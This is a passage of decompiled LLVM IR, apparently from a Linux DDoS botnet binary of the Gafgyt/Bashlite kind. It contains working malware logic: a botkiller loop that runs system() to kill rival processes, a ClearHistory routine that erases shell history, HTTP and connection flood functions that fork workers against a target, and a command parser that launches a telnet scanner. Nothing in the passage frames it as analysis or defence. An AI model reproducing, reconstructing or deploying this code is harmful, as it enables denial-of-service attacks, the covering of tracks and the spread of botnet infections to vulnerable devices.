  uselistorder i1 %v0_804ea56, { 1, 0 }
  uselistorder i32 %v7_804ea54, { 1, 0 }
  uselistorder i1 %v0_804ea11, { 1, 0 }
  uselistorder i32 %v7_804ea0f, { 1, 0 }
  uselistorder i32 %v4_804e9f1, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_-156.125, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-160.126, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804eb74, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804eb62, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i8* %v2_804e998, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804e982, { 1, 0 }
  uselistorder i32 %v7_804e980, { 1, 0 }
  uselistorder i32 %v2_804e92f, { 1, 0 }
  uselistorder i32 %v1_804e8ec, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %v2_804e8d4, { 15, 14, 12, 13, 11, 10, 9, 27, 26, 25, 8, 7, 24, 6, 4, 5, 23, 22, 21, 20, 28, 19, 18, 17, 16, 2, 3, 1, 0 }
  uselistorder i32 %v1_804e8b0, { 1, 0, 2 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804e8a6, { 1, 0 }
  uselistorder i32 %v4_804e811, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v1_804e7b7, { 1, 0 }
  uselistorder i32 %v15_804e789, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0 }
  uselistorder i32* %stack_var_-64, { 1, 2, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %eax.global-to-local, { 31, 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 48, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 44, 43, 45, 46, 47, 50, 49, 52, 51, 53, 54, 56, 55, 58, 57, 59, 60 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 18, 4, 5, 7, 6, 8, 10, 9, 11, 13, 12, 14, 16, 15, 17, 38, 39, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 3, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ed40, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804ec57, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ebf4, { 1, 0 }
  uselistorder label %dec_label_pc_804eb8b, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804e9f1, { 1, 0 }
  uselistorder label %dec_label_pc_804e8ad, { 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %dec_label_pc_804e7c9, { 1, 0 }
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %v2_804ed5d = ptrtoint i32* %stack_var_-88 to i32
  %v2_804ed87 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_804ed51

dec_label_pc_804ed51:                             ; preds = %dec_label_pc_804edf5, %entry
  br label %dec_label_pc_804ed5d

dec_label_pc_804ed5d:                             ; preds = %dec_label_pc_804ed51, %dec_label_pc_804ed5d
  %storemerge8 = phi i32 [ 0, %dec_label_pc_804ed51 ], [ %v4_804ede8, %dec_label_pc_804ed5d ]
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v1_804ed76 = mul nuw nsw i32 %storemerge8, 4
  %v2_804ed76 = add i32 %v1_804ed76, ptrtoint ([87 x i8*]* @global_var_805c040.396 to i32)
  %v3_804ed76 = inttoptr i32 %v2_804ed76 to i32*
  %v4_804ed76 = load i32, i32* %v3_804ed76, align 4
  %v3_804ed87 = call i32 @strcat(i8* %v2_804ed87, i32 %v4_804ed76)
  %v1_804ed92 = call i32 @__libc_system(i32 %v2_804ed5d)
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v4_804edb4 = load i32, i32* %v3_804ed76, align 4
  %v3_804edc5 = call i32 @strcat(i8* %v2_804ed87, i32 %v4_804edb4)
  %v3_804edd8 = call i32 @strcat(i8* %v2_804ed87, i32 ptrtoint (i32* @global_var_8059639.397 to i32))
  %v1_804ede3 = call i32 @__libc_system(i32 %v2_804ed5d)
  %v4_804ede8 = add nuw nsw i32 %storemerge8, 1
  %exitcond = icmp eq i32 %v4_804ede8, 9
  br i1 %exitcond, label %dec_label_pc_804edf5, label %dec_label_pc_804ed5d

dec_label_pc_804edf5:                             ; preds = %dec_label_pc_804ed5d
  %v1_804edfc = call i32 @sleep(i32 5)
  br label %dec_label_pc_804ed51

; uselistorder directives
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 2, 0, 3 }
  uselistorder [3 x i8]* @global_var_80581bb.15, { 1, 0 }
  uselistorder label %dec_label_pc_804ed5d, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v2_804ee13 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_805963b.398 to i32))
  %v2_804ee1f = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_8059651.399 to i32))
  %v2_804ee2b = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_805966f.400 to i32))
  ret i32 %v2_804ee2b

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 2, 1, 0, 4, 3 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-580 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ee36 = load i32, i32* @esi, align 4
  %v0_804ee37 = load i32, i32* @ebx, align 4
  store i32 %v0_804ee37, i32* %stack_var_-16, align 4
  %v2_804ee48 = ptrtoint i32* %stack_var_-56 to i32
  %tmp37 = bitcast i32* %stack_var_-56 to i8*
  store i32 %v2_804ee48, i32* @edi, align 4
  store i32 ptrtoint ([7 x i8*]* @global_var_805985c.408 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804ee58 = call i8* @_memcpy(i8* %tmp37, i8* bitcast ([7 x i8*]* @global_var_805985c.408 to i8*), i32 7)
  %v2_804ee76 = call i32 @__GI_time(i32* null)
  %v5_804ee7b = add i32 %v2_804ee76, %arg5
  store i32 %v5_804ee7b, i32* @eax, align 4
  %v1_804ee81 = call i32 @random()
  %v2_804eec2 = mul i32 %v1_804ee81, -6
  store i32 %v2_804eec2, i32* @eax, align 4
  %v0_804eed0 = load i32, i32* @ebp, align 4
  %v2_804eed0 = mul i32 %v1_804ee81, -24
  %v3_804eed0 = add i32 %v2_804eed0, -52
  %v4_804eed0 = add i32 %v3_804eed0, %v0_804eed0
  %v5_804eed0 = inttoptr i32 %v4_804eed0 to i32*
  %v6_804eed0 = load i32, i32* %v5_804eed0, align 4
  store i32 %v6_804eed0, i32* @ebx, align 4
  %v1_804eed4 = call i32 @random()
  %v2_804ef02 = srem i32 %v1_804eed4, 3
  store i32 %v2_804ef02, i32* @edi, align 4
  %v2_804ef4e = ptrtoint i32* %stack_var_-580 to i32
  %v5_804ef57 = call i32 @sprintf(i32 %v2_804ef4e, i32 ptrtoint ([62 x i8]* @global_var_8059890.412 to i32), i32 %arg2, i32 %arg4)
  %v5_804f00145 = icmp sgt i32 %arg6, 0
  br i1 %v5_804f00145, label %dec_label_pc_804ef68, label %dec_label_pc_804f007

dec_label_pc_804ef68:                             ; preds = %entry, %dec_label_pc_804eff8
  %storemerge46 = phi i32 [ %v4_804eff8, %dec_label_pc_804eff8 ], [ 0, %entry ]
  %v1_804ef68 = call i32 @__libc_fork(i32 %storemerge46)
  %v1_804ef6d = icmp eq i32 %v1_804ef68, 0
  br i1 %v1_804ef6d, label %dec_label_pc_804eff8, label %dec_label_pc_804efdb.preheader

dec_label_pc_804efdb.preheader:                   ; preds = %dec_label_pc_804ef68
  %v4_804efaa = bitcast i32* %stack_var_-580 to i8*
  br label %dec_label_pc_804efdb

dec_label_pc_804ef77:                             ; preds = %dec_label_pc_804efdb
  store i32 %arg1, i32* @edx, align 4
  %v4_804ef88 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v4_804ef90 = icmp eq i32 %v4_804ef88, 0
  br i1 %v4_804ef90, label %dec_label_pc_804efdb, label %dec_label_pc_804ef96

dec_label_pc_804ef96:                             ; preds = %dec_label_pc_804ef77
  store i1 false, i1* @df, align 1
  store i32 %v2_804ef4e, i32* @edi, align 4
  %v3_804efb0 = call i32 @_strlen(i8* %v4_804efaa)
  %v5_804efcb = call i32 @__libc_write(i32 %v4_804ef88, i32* nonnull %stack_var_-580, i32 %v3_804efb0)
  %v1_804efd6 = call i32 @__libc_close(i32 %v4_804ef88)
  br label %dec_label_pc_804efdb

dec_label_pc_804efdb:                             ; preds = %dec_label_pc_804ef77, %dec_label_pc_804ef96, %dec_label_pc_804efdb.preheader
  %v2_804efe2 = call i32 @__GI_time(i32* null)
  %v5_804efea = icmp slt i32 %v2_804efe2, %v5_804ee7b
  br i1 %v5_804efea, label %dec_label_pc_804ef77, label %dec_label_pc_804efec

dec_label_pc_804efec:                             ; preds = %dec_label_pc_804efdb
  %v1_804eff3 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_804eff8:                             ; preds = %dec_label_pc_804ef68
  %v4_804eff8 = add nuw nsw i32 %storemerge46, 1
  %v5_804f001 = icmp slt i32 %v4_804eff8, %arg6
  br i1 %v5_804f001, label %dec_label_pc_804ef68, label %dec_label_pc_804f007

dec_label_pc_804f007:                             ; preds = %dec_label_pc_804eff8, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804eff8, %dec_label_pc_804eff8 ]
  %v2_804f00d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f00d, i32* @ebx, align 4
  store i32 %v0_804ee36, i32* @esi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804eff8, { 0, 2, 1 }
  uselistorder i32 %v4_804ef88, { 1, 0, 2 }
  uselistorder i32 %storemerge46, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804efdb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ef68, { 1, 0 }
}

define i32 @sendHTTP2(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-573 = alloca i32, align 4
  %stack_var_-572 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f015 = load i32, i32* @edi, align 4
  %v0_804f017 = load i32, i32* @ebx, align 4
  store i32 %v0_804f017, i32* %stack_var_-16, align 4
  %v2_804f028 = ptrtoint i32* %stack_var_-60 to i32
  %tmp30 = bitcast i32* %stack_var_-60 to i8*
  store i32 %v2_804f028, i32* @edi, align 4
  store i32 ptrtoint ([7 x i8*]* @global_var_80598d0.413 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804f038 = call i8* @_memcpy(i8* %tmp30, i8* bitcast ([7 x i8*]* @global_var_80598d0.413 to i8*), i32 7)
  %v2_804f041 = call i32 @__GI_time(i32* null)
  %v5_804f046 = add i32 %v2_804f041, %arg5
  %v2_804f0d1 = ptrtoint i32* %stack_var_-572 to i32
  %v4_804f124 = bitcast i32* %stack_var_-572 to i8*
  store i32 0, i32* @eax, align 4
  %v5_804f19c37 = icmp sgt i32 %arg6, 0
  br i1 %v5_804f19c37, label %dec_label_pc_804f05f, label %dec_label_pc_804f1a2

dec_label_pc_804f05f:                             ; preds = %entry, %dec_label_pc_804f193
  %storemerge38 = phi i32 [ %v4_804f193, %dec_label_pc_804f193 ], [ 0, %entry ]
  %v0_804f05f = call i32 @random()
  %v2_804f082 = sdiv i32 %v0_804f05f, 36
  store i32 %v2_804f082, i32* @ebx, align 4
  %tmp = mul i32 %v2_804f082, -36
  %v2_804f09e = add i32 %v0_804f05f, %tmp
  store i32 %v2_804f09e, i32* @edi, align 4
  %v5_804f0da = call i32 @sprintf(i32 %v2_804f0d1, i32 ptrtoint ([64 x i8]* @global_var_80598ec.414 to i32), i32 %arg1, i32 %arg4)
  %v1_804f0df = call i32 @__libc_fork(i32 %v2_804f0d1)
  %v1_804f0e4 = icmp eq i32 %v1_804f0df, 0
  br i1 %v1_804f0e4, label %dec_label_pc_804f193, label %dec_label_pc_804f172

dec_label_pc_804f0f1:                             ; preds = %dec_label_pc_804f172
  %v4_804f102 = call i32 @socket_connect(i32 %arg2, i16 %arg3)
  %v4_804f10a = icmp eq i32 %v4_804f102, 0
  br i1 %v4_804f10a, label %dec_label_pc_804f172, label %dec_label_pc_804f110

dec_label_pc_804f110:                             ; preds = %dec_label_pc_804f0f1
  store i1 false, i1* @df, align 1
  store i32 %v2_804f0d1, i32* @edi, align 4
  %v3_804f12a = call i32 @_strlen(i8* %v4_804f124)
  %v5_804f145 = call i32 @__libc_write(i32 %v4_804f102, i32* nonnull %stack_var_-572, i32 %v3_804f12a)
  %v5_804f162 = call i32 @__libc_read(i32 %v4_804f102, i32* nonnull %stack_var_-573, i32 1)
  %v1_804f16d = call i32 @__libc_close(i32 %v4_804f102)
  br label %dec_label_pc_804f172

dec_label_pc_804f172:                             ; preds = %dec_label_pc_804f0f1, %dec_label_pc_804f110, %dec_label_pc_804f05f
  %v2_804f179 = call i32 @__GI_time(i32* null)
  store i32 %v2_804f179, i32* @eax, align 4
  %v5_804f181 = icmp slt i32 %v2_804f179, %v5_804f046
  br i1 %v5_804f181, label %dec_label_pc_804f0f1, label %dec_label_pc_804f187

dec_label_pc_804f187:                             ; preds = %dec_label_pc_804f172
  %v1_804f18e = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804f193

dec_label_pc_804f193:                             ; preds = %dec_label_pc_804f05f, %dec_label_pc_804f187
  %v4_804f193 = add nuw nsw i32 %storemerge38, 1
  store i32 %v4_804f193, i32* @eax, align 4
  %exitcond = icmp eq i32 %v4_804f193, %arg6
  br i1 %exitcond, label %dec_label_pc_804f1a2, label %dec_label_pc_804f05f

dec_label_pc_804f1a2:                             ; preds = %dec_label_pc_804f193, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg6, %dec_label_pc_804f193 ]
  %v2_804f1a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f1a8, i32* @ebx, align 4
  store i32 %v0_804f015, i32* @edi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804f193, { 1, 2, 0 }
  uselistorder i32 %v4_804f102, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804f0d1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f193, { 1, 0 }
  uselistorder label %dec_label_pc_804f172, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f05f, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f1ad = load i32, i32* @ebp, align 4
  store i32 %v0_804f1ad, i32* %stack_var_-4, align 4
  %v2_804f1ba = call i32 @__GI_time(i32* null)
  %v5_804f1bf = add i32 %v2_804f1ba, %arg3
  %v1_804f1cb = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804f1e2 = trunc i32 %arg2 to i16
  %v2_804f1e2 = call i32 @htons(i16 %v1_804f1e2)
  %v4_804f21a = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804f240

dec_label_pc_804f1f0:                             ; preds = %dec_label_pc_804f240
  %v3_804f207 = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_804f224 = call i32 @__libc_connect(i32 %v3_804f207, i32 %v4_804f21a, i32 16)
  %v1_804f230 = call i32 @sleep(i32 1)
  %v1_804f23b = call i32 @__libc_close(i32 %v3_804f207)
  br label %dec_label_pc_804f240

dec_label_pc_804f240:                             ; preds = %entry, %dec_label_pc_804f1f0
  %v2_804f247 = call i32 @__GI_time(i32* null)
  %v5_804f24f = icmp slt i32 %v2_804f247, %v5_804f1bf
  br i1 %v5_804f24f, label %dec_label_pc_804f1f0, label %dec_label_pc_804f251

dec_label_pc_804f251:                             ; preds = %dec_label_pc_804f240
  %v2_804f251 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f251, i32* @ebp, align 4
  ret i32 %v2_804f247

; uselistorder directives
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder label %dec_label_pc_804f240, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp164 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804f256 = load i32, i32* @edi, align 4
  %v0_804f257 = load i32, i32* @esi, align 4
  %v0_804f258 = load i32, i32* @ebx, align 4
  store i32 %v0_804f258, i32* %stack_var_-16, align 4
  %v5_804f259 = icmp ult i32* %stack_var_-16, inttoptr (i32 380 to i32*)
  store i1 %v5_804f259, i1* %cf.global-to-local, align 1
  %v2_804f262 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f27f = inttoptr i32 %v2_804f262 to i8*
  store i32 %v2_804f262, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8058937.21 to i32), i32* @edi, align 4
  %v7_804f291 = call i32 @_strncmp(i8* %v4_804f27f, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058937.21, i32 0, i32 0), i32 5)
  %v8_804f291 = urem i32 %v7_804f291, 2
  %v9_804f291 = icmp eq i32 %v8_804f291, 0
  %v0_804f293 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f293 = or i1 %v0_804f293, %v9_804f291
  %v3_804f293 = zext i1 %v2_804f293 to i32
  %v4_804f293 = load i32, i32* @edx, align 4
  %v5_804f293 = and i32 %v4_804f293, -256
  %v6_804f293 = or i32 %v3_804f293, %v5_804f293
  %v7_804f293 = xor i32 %v6_804f293, 1
  store i32 %v7_804f293, i32* %edx.global-to-local, align 4
  %v1_804f29b = trunc i32 %v7_804f293 to i8
  %v3_804f29b = zext i1 %v0_804f293 to i8
  %v15_804f29b = icmp eq i8 %v1_804f29b, %v3_804f29b
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f2a4 = icmp eq i1 %v15_804f29b, false
  br i1 %v1_804f2a4, label %dec_label_pc_804f2c0, label %dec_label_pc_804f2a6

dec_label_pc_804f2a6:                             ; preds = %entry
  %v0_804f2a6 = load i32, i32* @global_var_805c520.20, align 32
  %v2_804f2b6 = call i32 @sockprintf(i32 %v0_804f2a6, i32 ptrtoint ([6 x i8]* @global_var_805992c.415 to i32))
  br label %dec_label_pc_80502ec

dec_label_pc_804f2c0:                             ; preds = %entry
  %v2_804f2c3 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f2e0 = inttoptr i32 %v2_804f2c3 to i8*
  store i32 %v2_804f2c3, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8059932.416 to i32), i32* @edi, align 4
  %v7_804f2f2 = call i32 @_strncmp(i8* %v4_804f2e0, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059932.416, i32 0, i32 0), i32 6)
  %v8_804f2f2 = urem i32 %v7_804f2f2, 2
  %v9_804f2f2 = icmp eq i32 %v8_804f2f2, 0
  %v0_804f2f4 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f2f4 = or i1 %v0_804f2f4, %v9_804f2f2
  %v3_804f2f4 = zext i1 %v2_804f2f4 to i32
  %v4_804f2f4 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f2f4 = and i32 %v4_804f2f4, -256
  %v6_804f2f4 = or i32 %v3_804f2f4, %v5_804f2f4
  %v7_804f2f4 = xor i32 %v6_804f2f4, 1
  store i32 %v7_804f2f4, i32* %edx.global-to-local, align 4
  %v1_804f2fc = trunc i32 %v7_804f2f4 to i8
  %v3_804f2fc = zext i1 %v0_804f2f4 to i8
  %v15_804f2fc = icmp eq i8 %v1_804f2fc, %v3_804f2fc
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f305 = icmp eq i1 %v15_804f2fc, false
  br i1 %v1_804f305, label %dec_label_pc_804f32b, label %dec_label_pc_804f307

dec_label_pc_804f307:                             ; preds = %dec_label_pc_804f2c0
  %v0_804f307 = call i32 @getdtablesize()
  %v0_804f30c = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_804f30c, i32* %edx.global-to-local, align 4
  %v2_804f321 = call i32 @sockprintf(i32 %v0_804f30c, i32 ptrtoint ([3 x i8]* @global_var_8059938.417 to i32))
  br label %dec_label_pc_80502ec

dec_label_pc_804f32b:                             ; preds = %dec_label_pc_804f2c0
  %v2_804f32e = load i32, i32* %arg2, align 4
  %v4_804f34b = inttoptr i32 %v2_804f32e to i8*
  %v7_804f35d = call i32 @_strncmp(i8* %v4_804f34b, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805993b.418, i32 0, i32 0), i32 8)
  %v8_804f35d = urem i32 %v7_804f35d, 2
  %v9_804f35d = icmp eq i32 %v8_804f35d, 0
  %v0_804f35f = load i1, i1* %cf.global-to-local, align 1
  %v2_804f35f = or i1 %v0_804f35f, %v9_804f35d
  %v3_804f35f = zext i1 %v2_804f35f to i32
  %v4_804f35f = load i32, i32* %edx.global-to-local, align 4
  %v5_804f35f = and i32 %v4_804f35f, -256
  %v6_804f35f = or i32 %v3_804f35f, %v5_804f35f
  %v7_804f35f = xor i32 %v6_804f35f, 1
  store i32 %v7_804f35f, i32* %edx.global-to-local, align 4
  %v1_804f367 = trunc i32 %v7_804f35f to i8
  %v3_804f367 = zext i1 %v0_804f35f to i8
  %v15_804f367 = icmp eq i8 %v1_804f367, %v3_804f367
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f370 = icmp eq i1 %v15_804f367, false
  br i1 %v1_804f370, label %dec_label_pc_804f4ec, label %dec_label_pc_804f376

dec_label_pc_804f376:                             ; preds = %dec_label_pc_804f32b
  %v1_804f379 = add i32 %tmp164, 4
  %v5_804f379 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804f379, i1* %cf.global-to-local, align 1
  %v1_804f37c = inttoptr i32 %v1_804f379 to i32*
  %v2_804f37c = load i32, i32* %v1_804f37c, align 4
  store i1 false, i1* @df, align 1
  %v4_804f399 = inttoptr i32 %v2_804f37c to i8*
  store i32 %v2_804f37c, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059943.419 to i32), i32* @edi, align 4
  %v7_804f3ab = call i32 @_strncmp(i8* %v4_804f399, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059943.419, i32 0, i32 0), i32 4)
  %v8_804f3ab = urem i32 %v7_804f3ab, 2
  %v9_804f3ab = icmp eq i32 %v8_804f3ab, 0
  %v0_804f3ad = load i1, i1* %cf.global-to-local, align 1
  %v2_804f3ad = or i1 %v0_804f3ad, %v9_804f3ab
  %v3_804f3ad = zext i1 %v2_804f3ad to i32
  %v4_804f3ad = load i32, i32* %edx.global-to-local, align 4
  %v5_804f3ad = and i32 %v4_804f3ad, -256
  %v6_804f3ad = or i32 %v3_804f3ad, %v5_804f3ad
  %v7_804f3ad = xor i32 %v6_804f3ad, 1
  store i32 %v7_804f3ad, i32* @edx, align 4
  %v1_804f3b5 = trunc i32 %v7_804f3ad to i8
  %v3_804f3b5 = zext i1 %v0_804f3ad to i8
  %v15_804f3b5 = icmp eq i8 %v1_804f3b5, %v3_804f3b5
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f3be = icmp eq i1 %v15_804f3b5, false
  br i1 %v1_804f3be, label %dec_label_pc_804f401, label %dec_label_pc_804f3c0

dec_label_pc_804f3c0:                             ; preds = %dec_label_pc_804f376
  %v0_804f3c0 = load i32, i32* @global_var_80627b0.420, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f3c5 = icmp eq i32 %v0_804f3c0, 0
  br i1 %v1_804f3c5, label %dec_label_pc_80502ec, label %dec_label_pc_804f3cd

dec_label_pc_804f3cd:                             ; preds = %dec_label_pc_804f3c0
  %v2_804f3dd = call i32 @kill(i32 %v0_804f3c0, i32 9)
  %v0_804f3e2 = load i32, i32* @global_var_805c520.20, align 32
  %v2_804f3f2 = call i32 @sockprintf(i32 %v0_804f3e2, i32 ptrtoint ([17 x i8]* @global_var_8059947.421 to i32))
  store i32 0, i32* @global_var_80627b0.420, align 16
  br label %dec_label_pc_804f401

dec_label_pc_804f401:                             ; preds = %dec_label_pc_804f376, %dec_label_pc_804f3cd
  store i1 %v5_804f379, i1* %cf.global-to-local, align 1
  %v2_804f407 = load i32, i32* %v1_804f37c, align 4
  store i1 false, i1* @df, align 1
  %v4_804f424 = inttoptr i32 %v2_804f407 to i8*
  store i32 %v2_804f407, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8059958.422 to i32), i32* @edi, align 4
  %v7_804f436 = call i32 @_strncmp(i8* %v4_804f424, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8059958.422, i32 0, i32 0), i32 3)
  %v8_804f436 = urem i32 %v7_804f436, 2
  %v9_804f436 = icmp eq i32 %v8_804f436, 0
  %v0_804f438 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f438 = or i1 %v0_804f438, %v9_804f436
  %v3_804f438 = zext i1 %v2_804f438 to i32
  %v4_804f438 = load i32, i32* @edx, align 4
  %v5_804f438 = and i32 %v4_804f438, -256
  %v6_804f438 = or i32 %v3_804f438, %v5_804f438
  %v7_804f438 = xor i32 %v6_804f438, 1
  store i32 %v7_804f438, i32* %edx.global-to-local, align 4
  %v1_804f440 = trunc i32 %v7_804f438 to i8
  %v3_804f440 = zext i1 %v0_804f438 to i8
  %v15_804f440 = icmp eq i8 %v1_804f440, %v3_804f440
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f449 = icmp eq i1 %v15_804f440, false
  br i1 %v1_804f449, label %dec_label_pc_804f4ec, label %dec_label_pc_804f44f

dec_label_pc_804f44f:                             ; preds = %dec_label_pc_804f401
  %v0_804f44f = load i32, i32* @global_var_80627b0.420, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f454 = icmp eq i32 %v0_804f44f, 0
  %v1_804f456 = icmp eq i1 %v1_804f454, false
  br i1 %v1_804f456, label %dec_label_pc_80502ec, label %dec_label_pc_804f45c

dec_label_pc_804f45c:                             ; preds = %dec_label_pc_804f44f
  %v1_804f45c = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f47b = icmp eq i32 %v1_804f45c, 0
  br i1 %v4_804f47b, label %dec_label_pc_804f4a1, label %dec_label_pc_804f484

dec_label_pc_804f484:                             ; preds = %dec_label_pc_804f45c
  store i32 %v1_804f45c, i32* @global_var_80627b0.420, align 16
  br label %dec_label_pc_80502ec

dec_label_pc_804f4a1:                             ; preds = %dec_label_pc_804f45c
  store i1 true, i1* %cf.global-to-local, align 1
  %v0_804f4a1 = load i32, i32* @global_var_80627a8.240, align 8
  %v1_804f4a9 = call i32 @__GI_inet_ntoa(i32 %v0_804f4a1)
  %v0_804f4ae = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_804f4ae, i32* %edx.global-to-local, align 4
  %v2_804f4c3 = call i32 @sockprintf(i32 %v0_804f4ae, i32 ptrtoint ([26 x i8]* @global_var_805995b.423 to i32))
  %v2_804f4db = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_804f4e7 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f4ec:                             ; preds = %dec_label_pc_804f401, %dec_label_pc_804f32b
  %v2_804f4ef = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
